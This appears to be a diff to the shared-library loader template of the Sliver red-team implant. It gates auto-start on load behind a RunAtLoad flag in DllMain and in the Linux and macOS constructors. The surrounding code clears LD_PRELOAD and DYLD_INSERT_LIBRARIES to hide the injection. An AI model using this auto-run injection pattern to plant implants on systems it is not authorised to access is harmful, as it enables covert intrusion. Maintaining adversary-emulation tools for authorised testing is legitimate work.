@@ -1,6 +1,9 @@
 #include "sliver.h"
 
 #ifdef __WIN32
+#include <windows.h>
+
+void StartW();
 
 DWORD WINAPI Start()
 {
@@ -18,13 +21,13 @@ BOOL WINAPI DllMain(
     case DLL_PROCESS_ATTACH:
         // Initialize once for each new process.
         // Return FALSE to fail DLL load.
-    {
-        // {{if .Config.IsSharedLib}}
-        HANDLE hThread = CreateThread(NULL, 0, Start, NULL, 0, NULL);
-        // CreateThread() because otherwise DllMain() is highly likely to deadlock.
-        // {{end}}
-    }
-    break;
+        {
+            // {{if .Config.RunAtLoad}}
+            // CreateThread() because otherwise DllMain() is highly likely to deadlock.
+            HANDLE hThread = CreateThread(NULL, 0, Start, NULL, 0, NULL);
+            // {{end}}
+        }
+        break;
     case DLL_PROCESS_DETACH:
         // Perform any necessary cleanup.
         break;
@@ -46,7 +49,9 @@ static void init(int argc, char **argv, char **envp)
 {
     unsetenv("LD_PRELOAD");
     unsetenv("LD_PARAMS");
+    // {{if .Config.RunAtLoad}}
     StartW();
+    // {{end}}
 }
 __attribute__((section(".init_array"), used)) static typeof(init) *init_p = init;
 #elif __APPLE__
@@ -57,7 +62,9 @@ __attribute__((constructor)) static void init(int argc, char **argv, char **envp
 {
     unsetenv("DYLD_INSERT_LIBRARIES");
     unsetenv("LD_PARAMS");
+    // {{if .Config.RunAtLoad}}
     StartW();
+    // {{end}}
 }
 
 #endif
